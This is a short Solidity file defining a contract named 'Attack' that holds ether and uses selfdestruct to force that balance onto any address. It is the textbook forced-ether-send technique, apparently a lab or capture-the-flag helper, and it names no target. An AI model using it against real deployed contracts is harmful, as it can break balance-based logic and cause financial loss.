// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

contract Attack {
    constructor () payable {}

    function attack(address payable to) public {
        selfdestruct(to);
    }
}